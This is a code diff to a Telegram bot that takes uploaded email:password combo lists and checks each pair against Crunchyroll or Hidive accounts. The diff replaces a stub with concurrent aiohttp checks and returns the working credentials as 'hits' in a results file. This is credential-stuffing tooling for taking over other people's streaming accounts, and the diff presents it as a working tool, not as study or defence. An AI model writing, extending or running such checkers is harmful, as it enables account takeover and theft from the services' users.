@@ -22,8 +22,10 @@ import asyncio
 import os
 import time
 from pathlib import Path
+from typing import Optional
 
 import aiofiles
+import aiohttp
 from pyrogram import Client, filters
 from pyrogram.errors import FloodWait, MessageNotModified
 from pyrogram.types import (
@@ -33,8 +35,11 @@ from pyrogram.types import (
     Message,
 )
 
+from bot.core.client import app
 from bot.core.config import OWNER_ID, STATUS_INTERVAL, TEMP_DIR
 from bot.database.db import is_admin, is_authorized
+from bot.modules import crunchyroll as cr_mod
+from bot.modules import hidive as hd_mod
 from bot.utils.logger import setup_logger
 from bot.utils.task_manager import task_manager
 
@@ -47,6 +52,15 @@ MODULES: dict[str, str] = {
     "mod_cr": "🍥 Crunchyroll",
     "mod_hd": "📺 Hidive",
 }
+
+# Maps module keys to (check_func, format_hit, format_hit_line).
+_CHECKERS = {
+    "mod_cr": (cr_mod.check_account, cr_mod.format_hit, cr_mod.format_hit_line),
+    "mod_hd": (hd_mod.check_account, hd_mod.format_hit, hd_mod.format_hit_line),
+}
+
+# Max concurrent HTTP checks within a single file-processing task.
+_INNER_CONCURRENCY = 10
 
 # Map of pending file paths keyed by "<user_id>:<message_id>".
 _pending_files: dict[str, str] = {}
@@ -89,7 +103,7 @@ async def _safe_edit(message: Message, text: str) -> None:
 
 # ── Document upload handler ─────────────────────────────────────────────
 
-@Client.on_message(
+@app.on_message(
     filters.document & filters.private & ~filters.forwarded
 )
 async def document_handler(_client: Client, message: Message) -> None:
@@ -131,7 +145,7 @@ async def document_handler(_client: Client, message: Message) -> None:
 
 # ── Callback query handler (module selection) ──────────────────────────
 
-@Client.on_callback_query(filters.regex(r"^mod_"))
+@app.on_callback_query(filters.regex(r"^mod_"))
 async def module_callback_handler(
     _client: Client, callback: CallbackQuery
 ) -> None:
@@ -185,6 +199,24 @@ async def module_callback_handler(
 
 # ── File-processing worker ─────────────────────────────────────────────
 
+async def _check_single_line(
+    line: str,
+    check_func,
+    session: aiohttp.ClientSession,
+    semaphore: asyncio.Semaphore,
+) -> Optional[dict]:
+    """Parse and check a single email:password combo line."""
+    if ":" not in line:
+        return None
+    email, password = line.split(":", 1)
+    email = email.strip()
+    password = password.strip()
+    if not email or not password:
+        return None
+    async with semaphore:
+        return await check_func(email, password, session)
+
+
 async def _process_file(
     file_path: str,
     module_key: str,
@@ -194,6 +226,12 @@ async def _process_file(
     module.  Updates the Telegram message with throttled status edits.
     """
     module_label = MODULES.get(module_key, module_key)
+    checker = _CHECKERS.get(module_key)
+    if checker is None:
+        await _safe_edit(message, f"❌ Unknown module: {module_key}")
+        return
+    check_func, format_hit, format_hit_line = checker
+
     lines: list[str] = []
 
     try:
@@ -212,8 +250,9 @@ async def _process_file(
         await _safe_edit(message, "⚠️ The uploaded file is empty.")
         return
 
-    hits: list[str] = []
+    hits: list[dict] = []
     checked = 0
+    errors = 0
     last_edit = 0.0
 
     await _safe_edit(
@@ -225,37 +264,44 @@ async def _process_file(
         ),
     )
 
-    for line in lines:
-        # Check for cancellation at each iteration.
-        await asyncio.sleep(0)  # Yield to the event loop.
+    sem = asyncio.Semaphore(_INNER_CONCURRENCY)
 
-        checked += 1
+    async with aiohttp.ClientSession() as session:
+        for line in lines:
+            # Check for cancellation at each iteration.
+            await asyncio.sleep(0)
 
-        # ── Per-line processing stub ────────────────────────────────
-        # Replace this section with actual module logic (HTTP checks,
-        # API calls, etc.).  The placeholder below simply validates
-        # that the line contains a colon-separated pair.
-        if ":" in line:
-            hits.append(line)
-        # ── End stub ────────────────────────────────────────────────
+            checked += 1
 
-        # Throttled status update.
-        now = time.monotonic()
-        if now - last_edit >= STATUS_INTERVAL:
-            last_edit = now
-            await _safe_edit(
-                message,
-                (
-                    f"⚙️ **Module:** {module_label}\n"
-                    f"📌 **Status:** Processing…\n"
-                    f"📊 **Progress:** {checked}/{total}\n"
-                    f"✅ **Hits:** {len(hits)}"
-                ),
-            )
+            try:
+                result = await _check_single_line(
+                    line, check_func, session, sem
+                )
+                if result is not None:
+                    hits.append(result)
+            except Exception:
+                errors += 1
+                log.debug("Error checking line: %s", line, exc_info=True)
+
+            # Throttled status update.
+            now = time.monotonic()
+            if now - last_edit >= STATUS_INTERVAL:
+                last_edit = now
+                await _safe_edit(
+                    message,
+                    (
+                        f"⚙️ **Module:** {module_label}\n"
+                        f"📌 **Status:** Processing…\n"
+                        f"📊 **Progress:** {checked}/{total}\n"
+                        f"✅ **Hits:** {len(hits)} | ❌ Errors: {errors}"
+                    ),
+                )
 
     # ── Final summary ───────────────────────────────────────────────────
-    hit_text = "\n".join(hits[:50])  # Show at most 50 results inline.
-    overflow = f"\n…and {len(hits) - 50} more." if len(hits) > 50 else ""
+    hit_preview = "\n".join(
+        format_hit_line(h) for h in hits[:20]
+    )
+    overflow = f"\n…and {len(hits) - 20} more." if len(hits) > 20 else ""
 
     await _safe_edit(
         message,
@@ -263,8 +309,8 @@ async def _process_file(
             f"✅ **Done!**\n"
             f"⚙️ **Module:** {module_label}\n"
             f"📊 **Checked:** {total}\n"
-            f"🎯 **Hits:** {len(hits)}\n\n"
-            f"```\n{hit_text}{overflow}\n```"
+            f"🎯 **Hits:** {len(hits)} | ❌ Errors: {errors}\n\n"
+            f"```\n{hit_preview}{overflow}\n```"
         ),
     )
 
@@ -276,7 +322,9 @@ async def _process_file(
         try:
             async with aiofiles.open(results_path, "w",
                                      encoding="utf-8") as rf:
-                await rf.write("\n".join(hits))
+                await rf.write(
+                    "\n".join(format_hit_line(h) for h in hits)
+                )
             await message.reply_document(
                 document=results_path,
                 caption=f"🎯 {len(hits)} hits from {module_label}",
